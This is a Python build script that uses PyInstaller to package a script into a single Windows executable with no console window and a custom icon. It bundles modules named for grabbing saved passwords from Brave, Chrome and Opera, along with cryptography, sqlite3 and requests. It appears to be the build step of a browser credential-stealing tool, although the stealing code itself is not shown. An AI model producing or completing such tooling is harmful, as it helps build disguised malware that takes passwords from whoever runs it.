import subprocess
import sys
import os

def make_exe(icon_path="icons/default_icon.ico"):
    
    script_path = os.path.abspath("final_output.py")
    icon_path = os.path.abspath(icon_path)

    if not os.path.exists(icon_path):
        print(f"Icon file couldn't find: {icon_path}")
        sys.exit(1)
    
    pyinstaller_command = [
        "pyinstaller", 
        "--onefile", 
        "--noconsole",
        "--add-data", "get_brave_pass.py;.", 
        "--add-data", "get_chrome_pass.py;.", 
        "--add-data", "get_opera_pass.py;.", 
        "--collect-all", "requests",       
        "--collect-all", "sqlite3",      
        "--collect-all", "cryptography",   
        "--hidden-import", "requests.packages.urllib3", 
        "--hidden-import", "requests.packages.chardet", 
        "--hidden-import", "sqlite3.dbapi2",  
        "--hidden-import", "sqlite3.pysqlite3", 
        "--hidden-import", "psutil",        
        "--hidden-import", "winreg",         
        "--hidden-import", "getpass",        
        "--hidden-import", "json",           
        "--hidden-import", "subprocess",   
        "--hidden-import", "time",     
        "--icon", icon_path,
        script_path
    ]
    
    try:
        print("Creating exe with PyInstaller...")
        subprocess.check_call(pyinstaller_command)
        print("Created successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Got error from PyInstaller: {e}")
        sys.exit(1)

if __name__ == "__main__":
    make_exe()
